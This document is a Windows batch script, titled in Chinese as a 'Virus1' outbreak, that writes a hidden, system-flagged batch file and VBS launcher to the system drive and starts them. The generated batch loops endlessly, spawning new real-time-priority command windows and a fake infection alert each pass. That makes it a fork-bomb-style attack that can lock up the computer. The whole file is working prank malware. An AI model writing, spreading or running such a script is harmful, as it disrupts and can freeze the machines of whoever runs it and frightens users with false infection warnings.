@ECHO OFF
CHCP 936
CD /D "%~DP0"
FOR /F "TOKENS=3 DELIMS=," %%I IN ('TYPE CONFIG.INI') DO (COLOR %%I)
TITLE Virus1病毒爆发中...
CLS
DEL /A /F /Q %SYSTEMDRIVE%\Vir1.bat>NUL
DEL /A /F /Q %SYSTEMDRIVE%\Vir1.vbs>NUL
ECHO @ECHO OFF>>%SYSTEMDRIVE%\Vir1.bat
ECHO GOTO SSS>>%SYSTEMDRIVE%\Vir1.bat
ECHO.>>%SYSTEMDRIVE%\Vir1.bat
ECHO :SSS>>%SYSTEMDRIVE%\Vir1.bat
ECHO START /REALTIME MSHTA VBSCRIPT:MSGBOX("您的系统已中%SYSTEMDRIVE%\Virus1病毒，请重启。",16,"%SYSTEMDRIVE%\Virus2"^)>>%SYSTEMDRIVE%\Vir1.bat
ECHO START /REALTIME CMD /K %%~S0>>%SYSTEMDRIVE%\Vir1.bat
ECHO IF 1==1 (GOTO SSS)>>%SYSTEMDRIVE%\Vir1.bat
ATTRIB +A +H +R +S %SYSTEMDRIVE%\Vir1.bat
ECHO SET WS=WScript.CreateObject("WScript.Shell"^)>%SYSTEMDRIVE%\Vir1.vbs
ECHO WS.Run "CMD.EXE /K %SYSTEMDRIVE%\Vir1.bat",RunHide>>%SYSTEMDRIVE%\Vir1.vbs
ATTRIB +A +H +R +S %SYSTEMDRIVE%\Vir1.vbs
START /REALTIME %SYSTEMDRIVE%\Vir1.vbs
EXIT